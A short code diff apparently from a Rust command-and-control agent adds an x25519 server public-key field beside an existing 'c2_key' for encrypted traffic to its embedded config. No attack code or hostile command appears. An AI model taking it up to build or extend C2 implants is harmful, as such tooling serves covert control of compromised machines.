@@ -20,6 +20,9 @@ pub struct AgentConfig {
     /// Hex-encoded 32-byte AES-GCM key. Empty = plaintext comms.
     #[serde(default)]
     pub c2_key:     String,
+    /// Hex-encoded 32-byte x25519 server static public key. Empty = no ECDH.
+    #[serde(default)]
+    pub server_pubkey: String,
 }
 
 // ── Embedded config ───────────────────────────────────────────────────────────
